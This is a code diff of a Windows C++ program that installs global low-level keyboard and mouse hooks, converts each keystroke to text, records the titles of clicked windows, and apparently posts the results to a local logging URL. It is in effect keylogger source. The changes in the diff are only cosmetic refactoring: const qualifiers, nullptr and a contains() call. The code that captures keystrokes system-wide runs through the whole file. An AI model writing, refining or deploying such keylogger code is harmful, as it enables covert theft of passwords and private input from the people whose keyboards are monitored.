@@ -10,7 +10,7 @@ const char* DEBUG_URL = "http://127.0.0.1:8000/log";
 constexpr int MOUSE_CLICK_CHECKS[2] = {VK_LBUTTON, VK_RBUTTON};
 const std::unordered_map<int, const char*> MOUSE_EVENT_TO_STRING {{VK_LBUTTON, "Left Click"}, {VK_RBUTTON, "Right Click"}};
 
-boolean checkModifierStatus(int vkCode) {
+boolean checkModifierStatus(const int vkCode) {
     return (GetAsyncKeyState(vkCode) & 0x8000) != 0;
 };
 
@@ -29,8 +29,8 @@ void addCombinationModifier(std::string* input) {
     }
 }
 
-LRESULT CALLBACK KeyboardCallback(int nCode, WPARAM wParam, WPARAM lParam) {
-    auto *kbStruct = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);
+LRESULT CALLBACK KeyboardCallback(const int nCode, const WPARAM wParam, const WPARAM lParam) {
+    const auto *kbStruct = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);
 
     if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
         char c = MapVirtualKey(kbStruct->vkCode, MAPVK_VK_TO_CHAR);
@@ -38,7 +38,7 @@ LRESULT CALLBACK KeyboardCallback(int nCode, WPARAM wParam, WPARAM lParam) {
         std::string final;
         addCombinationModifier(&final);
 
-        if (scanCodeMapFI.find(kbStruct->scanCode) != scanCodeMapFI.end()) {
+        if (scanCodeMapFI.contains(kbStruct->scanCode)) {
             final += scanCodeMapFI[kbStruct->scanCode];
         }
 
@@ -50,18 +50,18 @@ LRESULT CALLBACK KeyboardCallback(int nCode, WPARAM wParam, WPARAM lParam) {
        // printf("%s\n", r.text.c_str());
     }
 
-    return CallNextHookEx(NULL, nCode, wParam, lParam);
+    return CallNextHookEx(nullptr, nCode, wParam, lParam);
 }
 
 LRESULT CALLBACK MouseCallback(int nCode, WPARAM wParam, WPARAM lParam) {
-    auto *mouseStruct = reinterpret_cast<MOUSEHOOKSTRUCT *>(lParam);
-    auto point = mouseStruct->pt;
+    const auto *mouseStruct = reinterpret_cast<MOUSEHOOKSTRUCT *>(lParam);
+    const auto point = mouseStruct->pt;
 
     for (const int& x : MOUSE_CLICK_CHECKS) {
         if (checkModifierStatus(x)) {
             HWND window = WindowFromPoint(point);
 
-            const size_t len = 256;
+            constexpr size_t len = 256;
             char title_buffer[len];
 
             GetWindowTextA(window, title_buffer, len);
@@ -82,12 +82,12 @@ LRESULT CALLBACK MouseCallback(int nCode, WPARAM wParam, WPARAM lParam) {
 
     //printf("x: %d, y: %d\n", point.x, point.y);
 
-    return CallNextHookEx(NULL, nCode, wParam, lParam);
+    return CallNextHookEx(nullptr, nCode, wParam, lParam);
 }
 
 int main() {
-    HHOOK keyboard = SetWindowsHookEx(WH_KEYBOARD_LL, HOOKPROC(&KeyboardCallback), nullptr, 0);
-    HHOOK mouse = SetWindowsHookEx(WH_MOUSE_LL, HOOKPROC(&MouseCallback), nullptr, 0);
+    const HHOOK keyboard = SetWindowsHookEx(WH_KEYBOARD_LL, HOOKPROC(&KeyboardCallback), nullptr, 0);
+    const HHOOK mouse = SetWindowsHookEx(WH_MOUSE_LL, HOOKPROC(&MouseCallback), nullptr, 0);
 
     MSG message;
     while (GetMessage(&message, NULL, NULL, NULL) > 0) {
